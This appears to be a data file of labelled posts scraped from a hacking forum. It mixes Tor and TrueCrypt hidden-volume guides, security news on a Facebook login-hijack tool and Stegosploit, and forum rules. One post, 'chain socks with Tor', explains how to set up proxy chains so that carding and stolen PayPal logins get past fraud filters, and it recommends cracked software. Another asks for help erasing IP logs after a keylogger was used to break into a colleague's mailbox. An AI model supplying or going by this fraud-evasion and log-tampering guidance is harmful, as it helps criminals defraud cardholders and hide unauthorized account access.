\""You\"", the top most link. This will open up  your main user folder. Now, locate the folder called \""Downloads\"" and double click on it. Now, inside the \""Downloads\"" folder, double click on the folder called \""Tor Browser\"". Lastly, double click on the application: \""Start Tor Browser\"" When you do, you will see the Vidalia Control Panel appear, and you will  observe as you connect to the TOR network. When this is complete, your  web browser will open up and will automatically connect to the web  address: check.torproject.org This is to confirm that you are in fact using TOR. If you have followed  this guide correctly, then you will see the following green text, or  something similar: \""Congratulations. Your browser is configured to use Tor.\"" Now you can use this web browser the same as any other. You can go to  any website you wish, and neither your ISP or anyone else will be able  to see where you are going, or what you are doing. However, there are  still issues that need to be resolved, so dont begin browsing just yet. Important Safety Note If you fill out a form containing your email address, your name, or any  other sensitive information while using the TOR browser, be aware that  sometimes it is possible for an observer to see that information. When  using TOR, use it to access websites and content that you are *not* connected to via your real identity or any  username or nick name which links to your real identity. Let TOR be for  anonymous browsing solely. Do your online banking, or any other  activities involving your real identity using your normal web browser. 3 : Securing Your Hard Drive Being able to browse anonymously is one thing. However, you may choose  to download and save sensitive content or material to your computer  which you wish to keep private. This may include reading sensitive  documents, viewing pictures, or storing any kind of sensitive data. If you save *anything* to your computers harddrive, then it is possible  for someone who has confiscated your computer to determine what it was  you saved. This is often true even if you delete the content. For  example, suppose I use the Tor Browser and I navigate to a website  containing a sensitive document that I wish to read. If I saved that  document somewhere on my harddrive, then it is possible for someone else  to find it. If I *delete* that document, it may still be possible for  someone to undelete it. Further, even if I never save it to my harddrive but I simply look at it  using my word processing software, it may still be saved ina number of  ways including: 1. Often programs keep records of filenames. The filename alone is often enough to incriminate someone. 2. Often programs keep parts of the content viewed saved for various  reasons, such as for searching. This can include random excerpts of  text, thumbnails of images, and more. Often this \""partial\"" data is more  than enough to prove what the original data was. Often the \""partial\""  data is itself incriminating. 3. Sometimes, especially if you are running low on system memory, your  operating system may choose to use your hard-disk as a temporary RAM.  This is known as \""SWAP\"". Normally, whenever you turn off your computer,  whatever was in RAM is deleted. However, the data that goes to your SWAP  may persist and it may be possible for someone to see what content you  had open in your programs if that information is saved in RAM. Generally speaking, you *must* have a plan to secure any content that is  saved to your hard disk. Therefore, this guide would be incomplete if  we did not thoroughly address this. First, there are two kinds of such  content: 1. Deliberately saved content. 2. Inadvertently saved content. Deliberately saved content refers to content that you have chosen to  save on your harddisk so that you can access this content later. We will  address how to do this later in the guide. Inadvertently saved content refers to content that is saved by programs  you use, or your operating system. You have no way to even know what  this content might be. Therefore, this is the most dangerous. You may  browse and find a dozen sensitive documents, utterly delete them, and  some program may have saved the file names and excerpts of the data.  This will render your previous efforts futile. Content that is inadvertently saved to your harddisk comes in two flavors: 1. Content that is saved to your SWAP space. 2. Content that is saved by applications running on your computer, including your operating system. The surest way to prevent content from writing to your SWAP space is to  disable your SWAP space altogether. This may result in your computer  running a bit slower than normal, and may mean that you cannot use ram  intensive games and applications during the time your SWAP is disabled. Therefore, if you use this method, simply turn back on the SWAP when you  want to use those ram intensive applications. Also, you may choose not  to take this step. Here is how to disable your swap space if you are using Windows 7: *This step is recommended for advanced users only. If you are not comfortable doing this, you may safely skip this step.* Instructions are less verbose than usual, as these steps are intended  for advanced users only. If you do not fully understand these  instructions, skip this step. 1. From Control Panel, go to \""System and Security\"". 2. Click on \""System\"", and then choose \""Advanced system settings\"" in the left-most menu. 3. Under the \""Advanced\"" tab, under \""Performance\"", click \""Settings\"". 4. Under this \""Advanced\"" tab, under \""Virtual Memory\"", click \""Change\"" 5. Uncheck \""Automatically manage paging file sizes for all drives\"" 6. Select \""No paging file\"" 7. Save, reboot, and follow these same first 5 steps to confirm that \""No  paging file\"" is still selected. This means that you have successfully  disabled your swap. This means that *nothing* from RAM will be  inadvertently saved to your harddrive. To resume using SWAP again, simply click \""Automatically manage paging  file size for all drives.\"" You can switch between these two modes as you  desire. Generally speaking, your computer will run fine without a swap file, provided you have enough RAM. END OF ADVANCED INSTRUCTIONS [/HR]  The next issue we need to address is how to  prevent applications and/or your operating system from saving content  inadvertently that you do not want saved. For this, we are going to set  up a \""Virtual Machine\"". A \""Virtual Machine\"" is like a computer inside of your computer.  Everything you do inside the Virtual Machine (vm for short) will be  fully contained within itself and no one will be able to see what the vm  has been doing. Ideally, you want *ALL* of your sensitive computer  usage of any kind, TOR or NON TOR, to take place within a vm. In this  way, you can keep everything private that you wish while still using  your computer fully and getting the most out of it. Dont be afraid of this sounds complicated. This guide will take you  through every step slowly and methodically. Before we can set up a vm  however, we need to take another step. 4 : Setting up TrueCrypt, Encrypted Hidden Volumes If you save anything on your computer, it is likely that you do not want  just anyone to be able to see what you have saved. You want a way to  protect that information so that you can access it, and absolutely no  one else except those you trust. Therefore, it makes sense to set up a  system which protects your information and safeguards it against prying  eyes. The best such system for this is called \""True Crypt\"". \""True Crypt\"" is an  encryption software program which allows you to store many files and  directories inside of a single file on your harddrive. Further, this  file is encrypted and no one can actually see what you have saved there  unless they know your password. This sounds extremely high tech, but it is actually very easy to set up. We are going to do so, right now: 1. Go to  Hidden Content:  You must reply to see links  (or go to  Hidden Content:  You must reply to see links , and click on \""Downloads\"") 2. Under \""Latest Stable Version\"", under \""Windows 7/Vista/XP/2000\"", click \""Download\"" 3. The file will be called \""True Crypt Setup 7.0a.exe\"" or something similar. Run this file. 4. If prompted that a program needs your permission to continue, click \""Continue\"". 5. Check \""I accept and agree to be bound by these license terms\"" 6. Click \""Accept\"" 7. Ensure that \""Install\"" is selected, and click \""Next\"" 8. click \""Install\"" 9. You will see a dialog stating \""TrueCrypt has been successfully installed.\"" Click \""Ok\"" 10. Click \""No\"" when asked if you wish to view the tutorial/users guide. 11. Click \""Finish\"" At this point, TrueCrypt is now installed. Now we will set up truecrypt  so that we can begin using it to store sensitive information. 1. Click the \""Windows Logo\""/\""Start\"" button on the lower left corner of your screen. 2. Click \""All Programs\"" 3. Click \""TrueCrypt\"" 4. Click the \""TrueCrypt\"" application And now we can begin: 1. click the button \""Create Volume\"" 2. Ensuring that \""Create an encrypted file container\"" is selected, click \""Next\"" 3. Select \""Hidden TrueCrypt volume\"" and click \""Next\"". 4. Ensuring that \""Normal mode\"" is selected, click \""Next\"" 5. Click on \""Select File\"" Note which directory you are in on your computer. Look at the top of the  dialog that has opened and you will see the path you are in, most  likely the home directory for your username. An input box is provided  with a flashing cursor asking you to type in a file name. Here, you will  type in the following filename: random.txt You may of course replace random.txt with anything you like. This file  is going to be created and will be used to store many other files  inside. Do NOT use a filename for a file that already exists. The idea  here is that you are creating an entirely new file. It is also recommended though not required that you \""hide\"" this file  somewhere less obvious. If it is in your home directory, then someone  who has access to your computer may find it easier. You can also choose  to put this file on any other media, it doesnt have to be your hard  disk. You could for example save your truecrypt file to a usb flash  drive, an sd card, or some other media. It is up to you. 6. Once you have typed in the file name, click \""Save\"" 7. Make sure \""Never save history\"" is checked. 8. Click \""Next\"" 9. On the \""Outer Volume\"" screen, click \""Next\"" again. 10. The default Encryption Algorithm and Hash Algorithm are fine. Click \""Next\"" 11. Choose a file size. In order to benefit the most from this guide, you should have at least  10 gigabytes of free disk space. If not, then it is worth it for you to  purchase some form of media (such as a removable harddrive, a large sd  card, etc.) in order to proceed. TrueCrypt can be used on all forms of  digital media not just your hard disk. If you choose to proceed without  obtaining at least ten gigabytes of disk space, then select a size that  you are comfortable with (such as 100 MB). Ideally, you want to choose enough space to work with. I recommend 20 GB  at least. Remember that if you do need more space later, you can always  create additional TrueCrypt volumes using exactly these same steps. 12. Now you are prompted for a password. Read This Section Carefully The password you choose here is a decoy password. That means, this is  the password you would give to someone under duress. Suppose that  someone suspects that you were accessing sensitive information and they  threaten to beat you or worse if you do not reveal the password. THIS is  the password that you give to them. When you give someone this  password, it will be nearly impossible for them to prove that it is not  the RIGHT password. Further, they cannot even know that there is a  second password. Here are some tips for your password: A. Choose a password you will NEVER  forget. It may be ten years from now that you need it. Make it simple,  like your birthday repeated three times. B. Make sure it seems reasonable, that it appears to be a real password.  If the password is something stupid like \""123\"" then they may not  believe you. C. Remember that this is a password that you would give to someone if forced. It is *NOT* your actual password. D. Do not make this password too similar to what you plan to really use.  You do not want someone to guess your main password from this one. And with all of this in mind, choose your password. When you have typed it in twice, click \""Next\"". 13. \""Large Files\"", here you are asked whether or not you plan to store  files larger than 4 GIGABYTES. Choose \""No\"" and click \""Next\"" 14. \""Outer Volume Format\"", here you will notice some random numbers and  letters next to where it says \""Random Pool\"". Go ahead and move your  mouse around for a bit. This will increase the randomness and give you  better encryption. After about ten seconds of this, click \""Format\"". 15. Depending on the file size you selected, it will take some time to finish formatting. \""What is happening?\"" TrueCrypt is creating the file you asked it to, such as \""random.txt\"". It  is building a file system contained entirely within that one file. This  file system can be used to store files, directories, and more. Further,  it is encrypting this file system in such a way that without the right  password it will be impossible for anyone to access it. To *anyone*  other than you, this file will appear to be just a mess of random  characters. No one will even know that it is a truecrypt volume. 16. \""Outer Volume Contents\"", click on the button called, \""Open Outer Volume\"" An empty folder has opened up. This is empty because you have yet to put any files into your truecrypt volume. Do Not Put Any Sensitive Content Here This is the \""Decoy\"". This is what someone would see if you gave them the  password you used in the previous step. This is NOT where you are going  to store your sensitive data. If you have been forced into a situation  where you had to reveal your password to some individual, then that  individual will see whatever is in this folder. You need to have data in  this folder that appears to be sensitive enough to be protected by  truecrypt in order to fool them. Here are some important tips to keep in  mind: A. Do NOT use porn. Adult models can  sometimes appear to be underaged, and this can cause you to incriminate  yourself unintentionally. B. Do NOT use drawings/renderings/writings of porn. In many jurisdictions, these are just as illegal as photographs. C. Good choices for what to put here include: backups of documents, emails, financial documents, etc. D. Once you have placed files into this folder, *NEVER* place any more  files in the future. Doing so may damage your hidden content. Generally, you want to store innocent data where some individual looking  at it would find no cause against you, and yet at the same time they  would understand why you used TrueCrypt to secure that data. Now, go ahead and find files and store them in this folder. Be sure that  you leave at least ten gigabytes free. The more the better. When you are all done copying files into this folder, close the folder by clicking the \""x\"" in the top right corner. 17. click \""Next\"" 18. If prompted that \""A program needs your permission to continue\"", click \""Continue\"" 19. \""Hidden Volume\"", click \""Next\"" 20. The default encryption and hash algorithms are fine, click \""Next\"" 21. \""Hidden Volume Size\"", the maximum available space is indicated in  bold below the text box. Round down to the nearest full unit. For  example, if 19.97 GB is available, select 19 GB. If 12.0 GB are  available, select 11 GB. 22. If a warning dialog comes up, asking \""Are you sure you wish to continue\"", select \""Yes\"" 23. \""Hidden Volume Password\"" Important Read This Here you are going to select the REAL password. This is the password you  will NEVER reveal to ANYONE else under any circumstances. Only you will  know it. No one will be able to figure it out or even know that there  is a second password. Be aware that an individual intent on obtaining  your sensitive information may lie to you and claim to be able to figure  this out. They cannot. It is HIGHLY recommended that you choose a 64 character password here.  If it is difficult to remember a 64 character password, choose an 8  character password and simply repeat it 8 times. A date naturally has  exactly 8 numbers, and a significant date in your life repeated 8 times  would do just fine. 24. Type in your password twice, and click \""Next\"" 25. \""Large Files\"", select \""Yes\"" and click \""Next\"". 26. \""Hidden Volume Format\"", as before move your mouse around for about ten seconds randomly, and tehn click \""Format\"". 27. If prompted \""A program needs your permission to continue\"", select \""Continue\"" 28. A dialog will come up telling you that the hidden TrueCrypt volume has been successfully created. Click \""Ok\"" 29. Click \""Exit\"" Congratulations! You have just set up an encrypted file container on  your hard drive. Anything you store here will be inaccessible to anyone  except you. Further, you have protected this content with TWO passwords.  One that you will give to someone under threat, and one that only you  will know. Keep your real password well protected and never write it  down or give it to anyone else for any reason. Now, we should test BOTH passwords. 5. Testing TrueCrypt Volumes Once you have completed the above section, you will be back at  TrueCrypt. Go ahead and follow these steps to test the volumes you have  made. 1. Click \""Select File...\"" 2. Locate the file you created in the last section, most likely called  \""random.txt\"" or something similar. Remember that even though there is  both an outer and a hidden volume, both volumes are contained in a  single file. There are not two files, only one. 3. Click \""Open\"" 4. Choose a drive letter that you are not using (anything past M is  probably just fine). Click on that, For example click on \""O:\"" to  highlight it. 5. Click \""Mount\"" 6. Now you are prompted for a password. Read the below carefully: The password you provide here will determine WHICH volume is mounted to  the drive letter you specified. If you type in your decoy password, then  O:\\ will show all the files and directories you copied that you would  reveal if forced. If you type in your real password, then O:\\ will show  the files and directories that you never intend anyone to see. 7. After successfully typing in your password, you will see additional  detail to the right of the drive letter, including the full path to the  file you selected as well as the kind of volume it is (for example,  hidden). 8. Right click on your \""Windows Logo\""/\""Start Menu\"" icon, and scroll down  to the bottom where you can see your different drive letters. You will  see the drive letter you selected, for example: \""Local Disk (O:)\"". Click  on that. 9. If you selected your decoy password, you will see all the files and  folders that you moved there during the installation phase. If you  selected the real password, you will see whatever files and directories  you have placed so far into the hidden volume, if any. If you selected  your hidden volume password, you may now begin moving any sensitive  information you wish. Be aware that simply moving it from your main hard  disk is not enough. We will discuss how to ensure deleted data is  actually deleted later in the guide. \""What is happening?\"" When you select a file and mount it to a drive, you are telling your  computer that you have a new drive with files and folders on it. It is  the same thing as if you had plugged in a usb flash drive, a removable  harddrive, or an sd card into your computer. TrueCrypt causes your  computer to think that there is an entirely new disk drive on your  computer. You can use this disk drive just as if it *was* actually a usb  flash drive. You can copy files to it, directories, and use it just as  you would use a usb flash drive. When you are done, simply close all open windows/folders/applications  that are using your truecrypt drive letter, and then click \""Dismount\""  from within TrueCrypt while you have the drive letter highlighted. This  will once again hide all of this data, accessible only by re-mounting it  with the correct password.    """
1	Help Delete IP address Request	""" Hi Hackers I have a colleague at work that has been sabotaging and bullying me all the time and I know she spread rumours and stuff through emails to my other colleagues too. So IÃ¢â¬â¢ve obtained her username and password to her work account, which is on an exchange server. IÃ¢â¬â¢ve obtain through a USB Keyboard Keylogger device. So I did successfully got her username and password but I broke the one of the golden rules by accessing her 365 Exchange Webmail account on my ipad using my pocket wifi and also possibly at home as I access her account at home on my computer too. SHIT!!!!!! but.....When I got home I did download and used Mullvad to access the account but I was not sure if the connection was stable and I only know this as I looked at my browser history, downloaded mullvad 6:15PM, check whatsmyip 6:35, and then access emails 6:50pm etc. unfortunately Mullvad does not keep a log of it. so I am not sure if I am covered. so I am not sure it worked. So when I do present information to my managers about these emails, the IT will freak as you know, and would be a big security breach. So I need your service please to locate where my IP addresses are recorded or logged and delete the entries/history so that itÃ¢â¬â¢s not trace back to me. I also have some questions around my problem, if you can answer it:     When accessing Microsoft 365 Exchange Webmail, does it record the logs of the IP addresses that acesses it, or attempts too? (im guessing they do)     Why and How?     On the day I first login into her account was through my Ipad using my pocket wifi, is pocket wifi still traceable?     When I got home I did download and used Mullvad to access the account but I was not sure if the connection was stable and I only know this as I looked at my browser history, downloaded mullvad 6:15PM, check whatsmyip 6:35, and then access emails 6:50pm etc. unfortunately Mullvad does not keep a log of it. so I am not sure if I am covered.     How will my IP logs be used to trace who/IP by my IT guys? FYI I do have a dynamic IP address     I can;t claimed that I used her unlocked PC as she has a laptop that she brings into work and take home and also when the emails were access outside normal hours too?, plus she hates me so I don thinnk she would let me use her computer Also, I have download and bought a VPN program on my computer which changes my IP address for the purpose of accessing her account, but I am still not confident enough about it, whatÃ¢â¬â¢s your thoughts on this? I will pay top $$$, but I would need to know how you would go on about deleting the IP addresses especially (e.g. how you will do it nd how can you proved to me that you have done the job successfully) when they are most likely to be stored on Microsoft Exchange Server, As well as the fact that the exchange server and other company assets are protected by an unknown level of security by an unknown IT staff. Also I do have a work laptop, as I sometimes work from home, and my organisation uses CISCO VPN client so we can access our network etc remotely. And my employer is not government or bank etc. just a private business  Im also aware that some of you are ethical hackers too, but even if the above request is illegal can you provide me with some advise around preparing and defending myself when the police knocks on my door. OR Can you possible give some advise. I appreciate any help I can get. Thanks Spice """

0	Hacking Facebook Account with Reconnect Tool	"""   \"" Signup or Login with Facebook \""  ?? You might think twice before doing that next time. A security  researcher has discovered a critical flaw that allows hackers take over Facebook accounts on websites that leverage  Login with Facebook  feature.     The vulnerability doesnt grant hackers access to your actual Facebook  password, but it does allow them to access your accounts using Facebook  application developed by third-party websites such as  Bit.ly ,  Mashable ,  Vimeo ,  About.me ,  Stumbleupon ,  Angel.co  and possibly many more.     FLAW EXPLOITS THREE CSRFs PROTECTION   Egor Homakov , a researcher with pentesting company Sakurity, made  the social network giant aware of the bug a year ago, but the company  refused to fix the vulnerability because doing so would have ruined  compatibility of Facebook with a vast number of websites over the  Internet.  The critical flaw abuses the lack of CSRF ( Cross-Site Request Forgery ) protection for three different processes Ã¢â¬â      Facebook log in Facebook log out Third-party account connection   The first two issues  \""can be fixed by Facebook,\""  Homakov said, but have not done yet. However, the third one needs to be fixed by the website owners those who have integrate \"" Login with Facebook \"" feature into their websites.       TOOL TO HACK FACEBOOK ACCOUNTS   Therefore, blaming Facebook for dismal security in  Login with Facebook  feature, the researcher publicly released a tool, dubbed  RECONNECT , that exploits the bug and lets hackers to generate URLs that can be used to hijack accounts on third-party websites that use  Login with Facebook  button.     \"" Go blackhats, donÃ¢â¬â¢t be shy! \""  Homakov wrote on his Twitter, allegedly encouraging hackers and cyber criminals to take benefit from his ready to use tool.      Homakov also published a  Hidden Content:  You must reply to see links   which gives hackers a step-by-step process for setting up rogue  Facebook accounts that victims are redirected to when they tricked into  clicking on malicious URLs provided by the attackers.  [INDENT]  \""Now our Facebook account is connected to the victim account on that  website and we can log in that account directly to change  email/password, cancel bookings, read private messages and so on,\""  Homakov wrote in a blog post.[/INDENT]   RECONNECT  Facebook hacking tool can generate malicious URLs to  hijack Facebook accounts on third-party website including Booking.com,  Bit.ly, About.me, Stumbleupon, Angel.co, Mashable and Vimeo. However, any website that supports  Login with Facebook  can be hacked by manually inserting its link into the tool that generates Facebook login requests on behalf of its users.     HOW TO PROTECT YOURSELF ?   One could realize the dangerous consequences of RECONNECT Facebook  hacking tool by calculating how many number of websites over Internet  use that blue color   f   button of Facebook login. And once a  hacker makes a way to get into you account, they could access your  private information and use them to hack into your other online  accounts.     So, in order to prevent your accounts from malicious hackers,  Do Not click   on any suspicious URLs provided to you via online messages, emails or  social media accounts. And always be careful while surfing over the  Internet.     FACEBOOK RESPONDS TO THE ISSUE   Facebook says it has been aware of the issue for some time now and that  third-party sites can protect their users by utilizing Facebooks best  practices when using the Facebook sign-in feature.  [INDENT] A Facebook spokesperson released a statement saying,  \""This is a  well-understood behaviour. Site developers using Login can prevent this  issue by following our best practices and using the state parameter we  provide for OAuth Login.\"" [/INDENT]  The company also added that they have also made various changes in order  to help prevent login CSRF and are evaluating others while  \""aiming to preserve necessary functionality for a large number of sites that rely upon Facebook Login.\""   """

0	How to Run Multiple Whatsapp Account on Your Android Phone	"""   WhatsApp  is one of the most popular messenger app that also lets you share  pictures, videos, music files and so on. By now, everyone of us have  WhatsApp in our smartphones. I prefer WhatsApp among other messaging  apps due to its simplicity and instant messaging service.  Although each and everything is quite handy in WhatsApp, but \"" Whatâs the most disturbing part that you came across? \"" For me it is: If you run dual SIM in your Android smartphones, you might be willing to  enjoy two separate WhatsApp account for your two different telephone  numbers on your smartphone. Isnât it? However, this is where WhatsApp puts limitations on its users. WhatsApp  users can not use more than one WhatsApp account on their mobile  devices.      However, you are probably wondering: \"" How do I find an excellent solution for this problem that actually works? \""  Today, I am introducing you two different Android apps --  OGWhatsApp  and  SwitchMe  -- that allows users to run multiple WhatsApp accounts on a single smartphone.  METHOD 1: USING OGWhatsApp OGWhatsApp is an Android app that allows you to use two separate  WhatsApp accounts on your single Android device without any need to root  your Android device.    While running your normal WhatsApp account on your smartphone, you can  follow some simple steps (below) in order to run a different WhatsApp  account on the OGWhatsApp. Follow these simple steps to go: Step 1:  Take a complete backup of your WhatsApp data and restore it. Step 2:  Delete all the WhatsApp data by going to Settings>apps>WhatsApp>Clear Data.  Step 3:  Rename the /sdcard/WhatsApp directory to  /sdcard/OGWhatsApp. You can use any file manager for Android to do this  task, or from Windows. Step 4:  Uninstall your original WhatsApp app from your Android device.  Step 5:  Now  Hidden Content:  You must reply to see links  in your Android smartphone. Step 6:  Once installed, remember to verify your old number that  was previously registered with the original WhatsApp to OGWhatsApp. That  is it. Step 7:  Now re-install the official WhatsApp for your other number from the play store.  This is crazy: Enjoy two separate WhatsApp accounts for both telephone numbers on your  single Android device without even rooting your Android device. METHOD 2: USE SWITCHME TO RUN  MULTIPLE ACCOUNTS     Hidden Content:  You must reply to see links  SwitchMe is another Android app that allows you to have two separate  WhatsApp accounts on a single Android device, but this app requires your  Android smartphone be rooted.  Hereâs the deal: Switchme multiple account app allows you to log in and out of multiple  user spaces however it needs root access to do this. However, users  cannot access the other profile from their current profile because each  account within the multiple profiles will have its settings,  applications, and data. Follow these simple steps to go: Step 1:  Root your Android device. Step 2:  Make sure that you have WhatsApp app installed on your smartphone. Step 3:   Hidden Content:  You must reply to see links  on your smartphone. Step 4:  Run SwitchMe Multiple accounts, it will ask for Superuser request that you need to grant. Step 5:  Now create a user profile with your name in SwitchMe app.  This profile will be an administrator account containing all the  current apps and settings, and will also reflect your WhatsApp profile  that is already installed on your smartphone. Step 6:  Now create another profile using a different name by  tapping on the Create Profile button in SwitchMe app, and then choose  the Switch option by selecting this account. Step 7:  Now your smartphone will restart automatically and once  it is ready to use, install official WhatsApp again from Google Play  Store and register it for the different phone number. That is it. Congratulations!  Now you can easily use multiple WhatsApp accounts on your single Android  smartphone.

0	What are leechers ?	"""   A small tip, copy pasting will get you a permanent ban.    What is a leecher?    Definition of \""Leecher\"" In computing and specifically Internet, a leech is one who benefits, usually deliberately,   from others information or effort but does not offer anything in return,  or makes only token offerings in an attempt to avoid being called a leech.    A leecher is an individual who registers an account on the forum,  only  to post in the leaking-related contents in order to unlock hidden content.   They spend very little time in any other sections. Leechers are usually suspended within their first few days of registering.    If your user-title says Leecher, it doesnt necessarily mean that you are one. Simply increase your overall post count and your usertitle/ranking will automatically change.       How would a leecher usually be distinguished from other members? Spoiler Leechers would usually have a low amount of posts, reputation points, and little-to-no content on their profiles. Leechers can also be distinguished by their lack of grammar, spelling and poor sentence structures. Many of them create low-quality responses to threads, only because they cannot be bothered to create a formal response.    Another method of checking whether or not a member would be considered a leecher is to simply visit their profile page and click on the  Post Activity  option - this will allow you to check which sections this user spends a majority of their time posting in.   How can I prevent being labelled as a leecher?  If youre a newer member to the offensive community, you really want to give other users a positive first impression about yourself. Below, a few simple and straight forward steps will be listed so you wont give others the impression that youre a leecher.      1. Add an avatar image to your profile page.  Many leechers dont bother to add custom content to their profile, as they consider it a waste of time, because theyre only here for premium content. Spoiler Head over to the top right of the forum, where you will stumble upon your username. Click on your username and a drop-down menu shall appear. From there, click on the  User CP  option and proceed to the next page.         Head to the option which allows you to change your avatar image along the left-hand column under the  Your Profile  category.        Upon clicking on the  Change Avatar  option, upload a custom profile picture of your choice, or simply visit the  Default Gallery  for a few random selections.  NOTE;  please keep in mind that your avatar image may not include adult content, or anything which doesnt comply with  loffensivecommunity s forum rules/guidelines. 2. Read the community rules and guidelines.  Leechers have a tendency to register an account on  offensive community  and skip the most important part, the rules and guidelines. The boards rules and guidelines can be found by heading over to  Hidden Content:  You must reply to see links  of the website. Furthermore, it is also recommended that you review the  Hidden Content:  You must reply to see links , which can come in handy for future references.    3. Contribute back to the community.  One of the main reasons that members are entitled leechers is because they take from the community, and dont give anything in return. You can contribute back to the community by following a few of the below steps; Interact with the other members in sectors like  Hidden Content:  You must reply to see links   is  the most valuable thing to do on the forum. Create a graphical, social-engineering, marketing, or another sort of service which could benefit the community. Host a few member contests and giveaways. Whether youre giving away credits, virtual game items, or something along those lines, members will appreciate it. Create an informative and in-depth tutorial/guide which can benefit the community. Support  offensivecommunity.net  by purchasing an upgrade for yourself, or another member. The  Upgrade  page can be found by  Hidden Content:  You must reply to see links . Come up with a few of your own ideas!  4. Spend some times outside of the leaking-related sections.  Although this step may seem self-explanatory, it is recommended that you post outside of the leaking-related sections of the forum. Theres a function which forces leechers to create a couple of posts outside of the leaking-related sections, but thats not enough.

0	chain socks with Tor	"""   Introduction There are many reasons why you would need to add an extra hop after the exit node. If you’re trying to card some items on any site with fraud filters you’re obviously going to raise some flags if the cardholder lives in New York and you’re connecting from a German exit node. Same goes for Paypal logins. Keep in mind you will need to use a clean socks5 within the same region as the cardholder/account. If US within the same state, or otherwise within the same area. A link to sites providing private socks services is provided at the end of this article. Even if carding isn’t your thing many sites filter out exit nodes, so it’s a necessity to have some control over where you appear to be connecting from. Note: If you have the Tor Browser Bundle and haven’t installed Tor separately, use port 9150 in place of 9050 for the following configurations. Proxychains Quote Quote: First download & install proxychains: sudo apt-get install proxychains Then configure proxychains to setup your chain: sudo nano /etc/proxychains.conf Down towards the bottom you should see: Quote Quote: [ProxyList] # add proxy here …  # meanwile  # defaults set to “tor” Just write your list in using Tor as the first listed: Quote Quote: socks4 127.0.0.1 9050  socks5 ip.address.here port After that you should be done. Just go to terminal and set your browser to go through proxychains: proxychains firefox Proxifier If you are on Windows you will want to setup your chain using Proxifier. First download and install a cracked copy of proxifier. Once you have it installed and run go to Options -> Proxy Settings and configure your chain: Quote Quote: 127.0.0.1  | 9050 | SOCKS 5  IP.ADDRESS | PORT | SOCKS 5 Once you have set your proxy settings go to Options -> Proxification Rules and set the following rules: Quote Quote: Loopback | ALL | 127.0.0.1 | ALL  Tor           | tor.exe | ALL  | ALL Once you are finished go to Name Resolution, choose Remote, click OK, and you’re set. Keep in mind that if you use Proxifier you need to use a browser that isn’t already configured to connect through Tor or it will ignore the Proxifier settings and just route strictly through Tor. For this guide my recommendation is a copy of Firefox Portable that has been secured. Instructions for Proxifier 3.0 Profile -> Proxy Servers -> Add. Address 127.0.0.1, Port 9050, Socks v5 -> Ok. Popup box will ask whether to set as default. Select Yes. Now add your proxy you want to use in the same way. Click ‘Proxychains’ button then ‘Create’, and drag & drop to the new rule. You should have something that looks like this. New 127.0.0.1:9050 IP address:port (the details you entered earlier) Now go to Profile -> Proxification Rules. In the drop down menu for ‘Default’ select ‘Proxy socks5 127.0.0.1′ & uncheck the localhost rule. Then Add -> change action to ‘Chain new’. ->Ok. Next, Profile -> Name Resolution. Select Resolve hostname through Proxy.

0	XMPP/Jabber OTR	""" Hey guys. Dave here again, back to teach you how to chat safely and securely via the XMPP/Jabber messaging protocol. This tutorial will be done on Windows 7, but the same idea should be transferred across Linux distros and Mac OSX. The first thing you are going to want to download the XMPP client called Pidgin. This can be downloaded  Hidden Content:  You must reply to see links . Once it is downloaded, go ahead with the install to completion. Hidden Content:  You must reply to see links Once it is installed, start up Pidgin. You will be presented with two different Windows. Ignore them for now. We have to first go grab the software that will allow us to chat securely. It is called OTR, which stands for Off-the-Record messaging, and can be downloaded  Hidden Content:  You must reply to see links . Download and install it. Make sure that the Pidgin application is closed out from your screen and taskbar before installing OTR. Hidden Content:  You must reply to see links Great. OTR and Pidgin are now installed! No more downloads from here out in the tutorial, just a few simple configurations to Pidgin. The first thing we need to do is make the OTR plugin active in Pidgin. Do this by opening Pidgin, going to the “Tools” drop down, selecting “Plugins”, and clicking on the checkbox next to “Off-the-Record Messaging”. Hidden Content:  You must reply to see links Once we are done with that, we can enter our XMPP account details and start chatting, or make a new account if you do not have one. If you need a list of free XMPP service providers, you can get one at  Hidden Content:  You must reply to see links  link. For the example, I will make a new account with the  Hidden Content:  You must reply to see links  service. You can register through the client, like I will show you how to do, or you can register online from  Hidden Content:  You must reply to see links  link. The first step to register from the client will be to enter the username, password, and domain. The username and password will be your choosing, but the domain will be “ Hidden Content:  You must reply to see links ” without the quotation marks. The “Resource” box should be left blank. Next, check the “Create this new account on the server” box at the bottom of the screen. It should look something like this. Hidden Content:  You must reply to see links The next steps, to take one more step to be even more secure, will to set Tor as a SOCKS5 proxy, so that not only are the messages encrypted with OTR, but the traffic is encrypted with Tor. To do that, click on the “Proxy” tab, and set your “Host” and “Port” accordingly. Make sure that Tor is running as well, or you will get connection errors! Once this is done, click on the “Add” button, go back to the “Buddy List”, click on the “Accounts” drop down, click on “Manage Accounts”, and finally click the checkbox next to your account. This will send the request to the server, and ask you to confirm your new account. Hidden Content:  You must reply to see links If you get an error that pops up, don’t be worried. Sometimes, there is an error with the server, and you will have to register online. This has happened to me several times, and is normal. Just register on the website of the XMPP host you are using. Once you have done all of this, you need to add your buddy and get in a chat with him or her. I will be using a fake account for this example, but the same actions transfer over to when you chat with a real account. All you need to do is click on the “OTR” button in the chat room, and click “Start a Private Conversation”. Wait a few seconds, and just like that, you are chatting securely via XMPP. Hidden Content:  You must reply to see links I hope this tutorial has been helpful, and as always, if you have any questions or problems, feel free to post a comment, and I will do my best to help. Thank you so much.             """
0	Hack a Computer Using Just An Image	"""   Next time when someone sends you a photo of a cute cat or a hot chick than be careful before you click on the image to view — it might hack your machine. Yes, the normal looking images could hack your computers — thanks to a technique discovered by security researcher  Saumil Shah  from India. Dubbed \"" Stegosploit ,\"" the technique lets hackers hide malicious code inside the pixels of an image, hiding a malware exploit in plain sight to infect target victims. Just look at the image and you are HACKED! Like Us on  Hidden Content:  You must reply to see links : Shah demonstrated the technique during a talk  Hidden Content:  You must reply to see links , \"" Stegosploit: Hacking With Pictures, \"" he gave on Thursday at the Amsterdam hacking conference Hack In The Box. According to Shah, \""a good exploit is one that is delivered in style.\"" Keeping this in mind, Shah discovered a way to hide malicious code directly into an image, rather than hiding it in email attachments, PDFs or other types of files that are typically used to deliver and spread malicious exploits. To do so, Shah used  Steganography  — a technique of hiding messages and contents within a digital graphic image, making the messages impossible to spot with the naked eye. Heres How to Hack digital pictures to send malicious exploits: Until now Steganography is used to communicate secretly with each other by disguising a message in a way that anyone intercepting the communication will not realise its true purpose. Steganography is also being used by terrorist organisations to communicate securely with each other by sending messages to image and video files, due to which NSA officials are forced to watch Porn and much porn. However in this case, instead of secret messages, the malicious code or exploit is encoded inside the image’s pixels, which is then decoded using an  HTML 5 Canvas element  that allows for dynamic, scriptable rendering of images. The \""Secret Sauce\"" behind Stegosploit — this is what Shah calls it. 